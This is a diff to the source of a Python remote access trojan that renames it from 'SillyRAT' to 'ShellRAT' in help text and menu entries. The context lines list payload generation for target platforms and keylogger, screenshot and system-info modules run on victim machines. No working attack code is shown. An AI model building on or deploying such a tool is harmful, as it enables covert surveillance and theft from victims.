@@ -30,11 +30,11 @@ These are the commands available for usage:
     generate    Generate the Payload file for target platform
 
 You can further get help on available commands by supplying
-'--help' argument. For example: 'python3 sillyrat generate --help'
+'--help' argument. For example: 'python3 shellrat generate --help'
 will print help manual for generate commmand
 """
 
-__HELP_BIND__   = """usage: python3 sillyrat.py bind [--address ADDRESS] [--port PORT]
+__HELP_BIND__   = """usage: python3 shellrat.py bind [--address ADDRESS] [--port PORT]
 
     Args              Description
     -h, --help        Show Help for Bind command
@@ -47,7 +47,7 @@ the command interface
 """
 
 __HELP_GENERATE__ = """
-usage: python3 sillyrat.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]
+usage: python3 shellrat.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]
 
     Args              Description
     -h, --help        Show Help Manual for generate command
@@ -77,7 +77,7 @@ class PULL:
     UNDERLINE = '\033[4m'
     END = '\033[0m'
     LINEUP = '\033[F'
-
+ 
     def __init__(self):
         if not self.support_colors:
             self.win_colors()
@@ -139,7 +139,7 @@ class PULL:
             ('keylogger', 'KeyLogger Module'),
             ('sysinfo', 'Dump System, Processor, CPU and Network Information'),
             ('screenshot', 'Take Screenshot on Target Machine and Save on Local'),
-            ('exit', 'Exit from SillyRAT!')
+            ('exit', 'Exit from ShellRAT!')
         ]
         sys.stdout.write("\n")
         print(tabulate.tabulate(lister, headers=headers))
@@ -153,7 +153,7 @@ class PULL:
             ('connect', 'Connect to a Specific Client'),
             ('disconnect', 'Disconnect from Current Client'),
             ('clear', 'Clear Screen'),
-            ('exit', 'Exit from SillyRAT!')
+            ('exit', 'Exit from ShellRAT!')
         ]
         sys.stdout.write("\n")
         print(tabulate.tabulate(lister, headers=headers))
